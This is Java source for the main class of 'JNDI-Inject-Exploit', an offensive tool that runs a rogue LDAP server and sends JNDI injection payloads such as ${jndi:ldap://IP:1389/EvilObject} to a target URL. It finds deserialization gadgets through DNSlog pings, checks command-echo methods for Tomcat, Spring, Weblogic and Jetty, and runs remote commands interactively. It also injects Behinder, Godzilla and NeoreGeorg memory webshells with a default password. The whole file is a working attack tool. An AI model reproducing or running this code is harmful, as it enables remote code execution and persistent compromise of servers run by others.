package io.github.exp1orer;

import io.github.exp1orer.server.LDAPServer;
import io.github.exp1orer.util.*;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.util.*;

/**
 * @author SearchNull
 */
public class StartUp {
    public static String url;
    public static String method;
    public static Map<String, String> headers;
    public static String body;

    private static Map<String, String> options;
    private static LDAPServer ldapServer;
    private static String ip;
    private static int port;
    private static String file;
    private static Proxy proxy;
    private static Scanner sc;
    private static String command;
    private static String commandResult = "";
    private static boolean runFlag = false;
    private static List<String> validGadget = new ArrayList<String>();
    private static Map<String, List<String>> validCommandEcho = new HashMap<String, List<String>>();
    private static List<String> memoryShell = new ArrayList<String>();
    private static String[] commandEcho = new String[]{
            "directive:LinuxEcho",
            "directive:WindowsEcho",
            "directive:SpringEcho1",
            "directive:SpringEcho2",
//            "directive:Tomcat6Echo",
//            "directive:Tomcat78Echo",
//            "directive:Tomcat9Echo",
            "directive:TomcatEcho",
            "directive:TomcatEcho2",
            "directive:WeblogicEcho1",
            "directive:WeblogicEcho2",
            "directive:JettyEcho",
            "directive:AutoFindRequestEcho",
//            "directive:WriteFileEcho",
//            "directive:WriteClass"
    };

    public static void main(String[] args) {
        Parser parser = new Parser();
        options = parser.parse(args);

        if (options.get("ip") == null || (options.get("url") == null && options.get("file") == null)) {
            printUsage();
            System.exit(1);
        } else {
            initial();
            run();
            System.exit(1);
        }
    }

    /**
     * @description: ???????????????
     * @return void
     */
    private static void initial() {
        ip = options.get("ip");
        port = Integer.parseInt(options.get("port") == null ? "1389" : options.get("port"));
        if (options.get("url") == null && options.get("file") != null) {
            file = options.get("file");
            try {
                HttpUtil.formatHttp(file);
            } catch (IOException ioException) {
                System.out.println("????????? " + file + " ????????????!");
                ioException.printStackTrace();
                System.exit(1);
            }
        } else {
            url = options.get("url");
            method = options.get("method") == null ? "GET" : options.get("method");
            headers = Parser.parseHeaders(options.get("headers"));
            body = options.get("body");
        }

        if (options.get("proxy") != null) {
            String[] proxies = options.get("proxy").split(":", 2);
            proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxies[0], Integer.parseInt(proxies[1])));
        }
        memoryShell.add("TomcatBehinderFilter");
        memoryShell.add("TomcatBehinderServlet");
        memoryShell.add("TomcatGodzillaFilter");
        memoryShell.add("TomcatGodzillaServlet");
        memoryShell.add("TomcatNeoreGeorgFilter");
        memoryShell.add("TomcatNeoreGeorgServlet");
        memoryShell.add("TomcatShortMemShellFilter");
        memoryShell.add("TomcatShortMemShellServlet");
        memoryShell.add("ResinShortMemShellServlet");

        try {
            Class.forName("io.github.exp1orer.util.Config");
        } catch (ClassNotFoundException classNotFoundException) {
            classNotFoundException.printStackTrace();
        }
    }

    /**
     * @description: ??????????????????
     */
    private static void printUsage() {
        System.out.println("JNDI-Inject-Exploit Author:SearchNull\n");
        System.out.println("Usage: \n");
        System.out.println("java -jar JNDI-Inject-Exploit-[version]-all.jar [options]\n" +
                "\n" +
                "Options:\n" +
                "    ip        LDAP Server IP??????VPS???????????????IP???\n" +
                "    port      LDAP Server ????????????????????????1389\n" +
                "    url       ??????URL?????????headers???body?????????????????????HTTP??????\n" +
                "    file      ??????HTTP???????????????????????????????????????????????????????????????HTTP??????\n" +
                "    method    ??????HTTP????????????????????????GET\n" +
                "    headers   ??????HTTP????????????????????????????????????????????????=??????key,value\n" +
                "    body      ??????HTTP???????????????\n" +
                "    proxy     ??????HTTP????????????????????????eg: 127.0.0.1:8080, ?????????Http/S???\n");
        System.out.println("Example: java -jar JNDI-Inject-Exploit-0.3-all.jar ip=\"192.168.9.176\" url=\"http://192.168.9.120:8190/log?id=$%7bjndi:ldap://192.168.9.176:1389/EvilObject%7d\"");
    }

    /**
     * @description: ????????????gadget
     */
    private static void printGadget() {
        for (int i = 0; i < validGadget.size(); i++) {
            String payloadType = validGadget.get(i);
            if (validCommandEcho.get(payloadType) != null) {
                System.out.println(String.format("[%d] %s - %s - %s", i ,payloadType, validCommandEcho.get(payloadType), memoryShell));
            } else if (LDAPServer.gadgetType.get("codeExecute").contains(payloadType)) {
                System.out.println(String.format("[%d] %s - %s", i, payloadType, memoryShell));
            } else {
                System.out.println(String.format("[%d] %s", i, payloadType));
            }
        }
    }

    /**
     * @description: ???????????????
     * @return boolean
     * @author: SearchNull
     */
    private static boolean run() {
        int num = 0;

        ldapServer = new LDAPServer(ip, port);
        Thread threadldap = new Thread(ldapServer);
        threadldap.start();
        // ??????LDAPServer??????
        try {
            Thread.sleep(2000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        boolean gadget = checkGadget(ldapServer);
        if (gadget) {
            boolean result = checkCommandEcho();
            printGadget();

            while (true) {
                sc = new Scanner(System.in);
                try {
                    if (runFlag) {
                        executeCmd(num);
                        continue;
                    }
                    System.out.println("[+] Please enter the number (0-" + String.valueOf(validGadget.size() - 1) + ")" + ", enter q or quit to quit");
                    System.out.print("> ");
                    String option = sc.nextLine().trim();
                    if ("q".equalsIgnoreCase(option) || "quit".equalsIgnoreCase(option)) {
                        break;
                    } else {
                        int n = Integer.parseInt(option);
                        num = n;
                        if (n >= 0 && n < validGadget.size()) {
                            runFlag = true;
                            executeCmd(n);
                        }
                    }
                } catch (IOException ioException) {
                    ioException.printStackTrace();
                }
            }
        } else {
            System.out.println("[-] No gadget can be use, quit.");
            System.exit(1);
        }

        return true;
    }

    /**
     * @description: ?????????????????????????????????????????????gadget??????
     */
    private static void executeCmd(int i) throws IOException {
        System.out.println("[+] Please enter command the execute, enter q or quit to quit, enter back to re-choore gadget, enter shell name inject memory shell");
        System.out.print("> ");
        command = sc.nextLine().trim();
        if ("q".equalsIgnoreCase(command) || "quit".equalsIgnoreCase(command)) {
            System.exit(1);
        } else if ("back".equalsIgnoreCase(command)) {
            printGadget();
            runFlag = false;
            return;
        } else if (memoryShell.contains(command)) {
            if (validCommandEcho.get(validGadget.get(i)) != null) {
                String path, pwd;
                LDAPServer.serializedData = GeneratePayload.getPayload(validGadget.get(i), "code=" + MemoryShell.process(command));
                System.out.print("MemoryShell path ???default: /favicondemo.ico???> ");
                path = sc.nextLine().trim();
                if (!"NeoreGeorgFilter".equalsIgnoreCase(command) && !"NeoreGeorgServlet".equalsIgnoreCase(command)) {
                    System.out.print("MemoryShell pwd ???default: pass1024??? > ");
                    pwd = sc.nextLine().trim();
                } else {
                    pwd = "pass1024";
                }

                if (path.length() > 1 && pwd.length() > 1) {
                    Map<String, String> tempHeaders = headers;
                    tempHeaders.put("path", path);
                    tempHeaders.put("p", pwd);
                    boolean resp = HttpUtil.connection(url, method, tempHeaders, body, proxy);
                } else {
                    boolean resp = HttpUtil.connection(url, method, headers, body, proxy);
                }

                if (HttpUtil.getResponseBody().indexOf("->|Success|<-") != -1) {
                    System.out.println("[+] Memory shell inject success");
                }
            }
            return;
        }

        boolean commandExecuteStatus = runCommand(i, command);
        if (commandExecuteStatus && !"".equals(commandResult)) {
            System.out.println(commandResult);
            commandResult = "";
        }
    }

    /**
     * @description: ??????Gadget
     * @param ldapServer LDAPServer??????
     * @return boolean
     * @author: SearchNull
     */
    private static boolean checkGadget(LDAPServer ldapServer) {
        Map<String, String> tempRecord = new HashMap<String, String>();
        String dnslog;
        for (String gadget : ldapServer.gadgets) {
            System.out.println("[*] Check " + gadget);
            dnslog = Dnslog.getRandomDomain(4);
            LDAPServer.serializedData = GeneratePayload.getPayload(gadget, "ping -nc 1 " + dnslog);
            tempRecord.put(dnslog, gadget);
            boolean resp = HttpUtil.connection(url, method, headers, body, proxy);
        }
        // ??????Dnslog????????????
        try {
            Thread.sleep(Dnslog.sleep * 1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        for (String domain : tempRecord.keySet()) {
            boolean record = Dnslog.getRecord(domain);
            if (record) {
                ldapServer.gadgetFlag = true;
                validGadget.add(tempRecord.get(domain));
            }
        }

        return ldapServer.gadgetFlag;
    }

    /**
     * @description: ??????????????????
     * @return boolean
     * @author: SearchNull
     */
    private static boolean checkCommandEcho() {
        String respContent;
        String uuid = UUID.randomUUID().toString();
        String command = "echo " + uuid;
        if (headers == null) {
            headers = new HashMap<String, String>();
            headers.put("cmd", command);
        } else {
            headers.put("cmd", command);
        }

        for (int i = 0; i < validGadget.size(); i++) {
            List<String> validCommandEchoType = new ArrayList<String>();
            String payloadType = validGadget.get(i);
            System.out.println("[+] Can be use " + payloadType);
            if (LDAPServer.gadgetType.get("codeExecute").contains(payloadType)) {
                System.out.println("[*] Check command echo");
                for (String commandType : commandEcho) {
                    System.out.println("[*] Check " + commandType.split(":")[1]);
                    if (commandType.startsWith("directive:LinuxEcho") || commandType.startsWith("directive:WindowsEcho") || commandType.startsWith("directive:WeblogicEcho2") || commandType.startsWith("directive:WriteFileEcho")) {
                        commandType += ":" + command;
                    }
                    String code = "code=" + CommandEcho.process(commandType);
                    LDAPServer.serializedData = GeneratePayload.getPayload(payloadType, code);

                    boolean resp = HttpUtil.connection(url, method, headers, body, proxy);
                    try {
                        respContent = HttpUtil.getResponseBody();
                        if (respContent.contains(uuid)) {
                            ldapServer.echoFlag = true;
                            validCommandEchoType.add(commandType.split(":")[1]);
                        }
                    } catch (IOException io) {
                        io.printStackTrace();
                    }
                }

                if (ldapServer.echoFlag && validCommandEchoType.size() > 0) {
                    validCommandEcho.put(payloadType, validCommandEchoType);
                }

            }
        }

        return ldapServer.echoFlag;
    }

    /**
     * @description: ??????Gadget????????????
     * @param index validGadget??????
     * @param command ???????????????
     * @return boolean
     * @author: SearchNull
     */
    private static boolean runCommand(int index, String command) {
        String respContent;
        if (headers == null) {
            headers = new HashMap<String, String>();
        }
        if (validCommandEcho.get(validGadget.get(index)) != null) {
            List<String> commandEchoType = validCommandEcho.get(validGadget.get(index));
            String flagStr1 = Parser.getRandomStr(10);
            String flagStr2 = Parser.getRandomStr(10);
            String cmd = String.format("echo %s && %s && echo %s", flagStr1, command, flagStr2);
            headers.put("cmd", cmd);

            for (int i = 0; i < commandEchoType.size(); i++) {
                String commandType = "directive:" + commandEchoType.get(i);
                if (commandType.startsWith("directive:LinuxEcho") || commandType.startsWith("directive:WindowsEcho") || commandType.startsWith("directive:WeblogicEcho2") || commandType.startsWith("directive:WriteFileEcho")) {
                    commandType += ":" + cmd;
                }
                String code = "code=" + CommandEcho.process(commandType);
                LDAPServer.serializedData = GeneratePayload.getPayload(validGadget.get(index), code);
                boolean resp = HttpUtil.connection(url, method, headers, body, proxy);
                try {
                    respContent = HttpUtil.getResponseBody();
                    if (respContent.contains(flagStr1) && respContent.contains(flagStr2)) {
                        commandResult = respContent.substring(respContent.indexOf(flagStr1) + flagStr1.length(), respContent.indexOf(flagStr2));
                        break;
                    }
                } catch (IOException io) {
                    io.printStackTrace();
                }
            }
        } else if (validGadget.get(index) != null) {
            String payloadType = validGadget.get(index);
            LDAPServer.serializedData = GeneratePayload.getPayload(payloadType, command);
            boolean resp = HttpUtil.connection(url, method, headers, body, proxy);
            if (resp) {
                return true;
            }
        } else {
            return false;
        }

        return true;
    }
}